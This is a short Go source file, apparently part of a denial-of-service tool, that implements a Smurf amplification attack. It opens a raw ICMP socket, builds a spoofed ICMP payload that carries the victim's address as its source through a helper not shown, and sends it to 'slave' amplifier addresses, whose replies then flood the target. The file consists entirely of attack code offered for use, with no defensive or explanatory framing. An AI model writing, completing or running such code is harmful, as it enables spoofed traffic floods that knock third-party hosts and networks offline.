package main

import (
	"net"
	"syscall"

	"github.com/pkg/errors"
)

type smurf struct {
	sockfd  int
	slaves  *syscall.SockaddrInet4 // ICMP6 currently not supported
	payload []byte
}

func newSmurf(target, slaves net.IP) (*smurf, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		return nil, errors.Wrap(err, "could not get raw icmp socket")
	}

	var remote syscall.SockaddrInet4
	copy(remote.Addr[:], slaves.To4())

	pl, err := spoofedICMP(target, slaves)
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}

	return &smurf{
		sockfd:  fd,
		slaves:  &remote,
		payload: pl,
	}, nil
}

func (s *smurf) execute() error {
	return syscall.Sendto(s.sockfd, s.payload, 0, s.slaves)
}
